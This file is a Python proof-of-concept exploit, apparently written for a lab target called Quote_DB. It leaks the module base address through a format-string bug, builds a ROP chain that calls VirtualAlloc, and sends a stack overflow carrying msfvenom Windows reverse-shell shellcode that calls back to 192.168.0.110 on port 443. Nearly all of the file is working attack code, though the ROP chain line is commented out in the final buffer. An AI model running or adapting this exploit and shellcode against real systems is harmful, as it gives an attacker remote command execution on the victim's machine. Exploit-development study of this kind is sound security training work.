#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 500


badchars = (
    b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


# ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.110 LPORT=443 EXITFUNC=thread -f python -v shell
shell =  b"\x90" * 20
shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
shell += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
shell += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
shell += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
shell += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
shell += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
shell += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
shell += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
shell += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
shell += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
shell += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
shell += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
shell += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
shell += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
shell += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shell += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
shell += b"\x01\x6e\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56"
shell += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
shell += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
shell += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
shell += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
shell += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
shell += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
shell += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
shell += b"\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6"
shell += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# ===

rop = [
# 1. Get ESP (in eax)
    base + 0x25c0, # xor eax, eax ; ret
    base + 0x1e69, # or eax, esp ; ret

# 2. Get dummy call addr (in ebx)
    base + 0x2b38, # pop ecx ; ret
    0x1ec, # eax + ? = dummy call
    base + 0x9b36, # add eax, ecx ; pop ebx ; ret
    0xffffffff, # junk for pop ebx
    base + 0x1e73, # mov ebx, eax ; ret

# 3. Deref virtualAlloc (in eax)
    base + 0x2b37, # pop eax ; pop ecx ; ret
    base + 0x43218, # base + iat + virtualalloc
    0xffffffff, # junk for pop ecx
    base + 0x1e6c, # mov eax, [eax] ; add ecx, 0x5 ; pop edx ; ret
    0xffffffff, # junk for pop edx

# 4. Write virtual alloc to dummy
    base + 0x1e7a, # mov [ebx], eax ; ret

# 5. Get shellcode addr (in eax)
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
    base + 0x2cec, # mov eax, edx ; ret
    base + 0x2b38, # pop ecx ; ret
    0x18, # eax + ? = dummy call
    base + 0x9b36, # add eax, ecx ; pop ebx ; ret
    0xffffffff, # junk for pop ebx
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret

# 6. Get dummy call addr + 0x4 (in ebx)
    base + 0x1e82, # add ebx, 0x4 ; ret

# 7. Write shellcode addr to dummy + 0x4
    base + 0x1e7a, # mov [ebx], eax ; ret

# 8. Get dummy call addr + 0x8 (in ebx)
    base + 0x1e82, # add ebx, 0x4 ; ret

# 9. Write shellcode addr to dummy + 0x8
    base + 0x1e7a, # mov [ebx], eax ; ret

# 10. Align esp with dummy call (ebx-8)
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
    base + 0x2b38, # pop ecx ; ret
    0xfffffff8, # edx + ? = dummy call
    base + 0x1e86, # add edx, ecx ; ret
    base + 0x1e7d, # xchg edx, ebx ; cmp ebx, eax ; ret
    base + 0x1e76, # xchg ebx, esp ; dec ecx ; ret
]
rop = b"".join([pack("<I", r) for r in rop])


# ===

dummy  = b"aaaa" # VirtualAlloc
dummy += b"bbbb" # return <- shellcode addr
dummy += b"cccc" # lpAddress <- shellcode addr
dummy += pack("<I", 0x200) # dwSize <- 0x1
dummy += pack("<I", 0x1000) # flAllocationType <- 0x1000
dummy += pack("<I", 0x40) # flProtect <- 0x40

# ===

buf  = b"A" * 2060
# buf += rop # bp 000C1877
buf += b"B" * 4
buf += badchars
buf += b"C" * (ropSize - len(rop))
buf += dummy
buf += shell

# ===

print("[+] Triggering overflow...")

bad_request(buf)
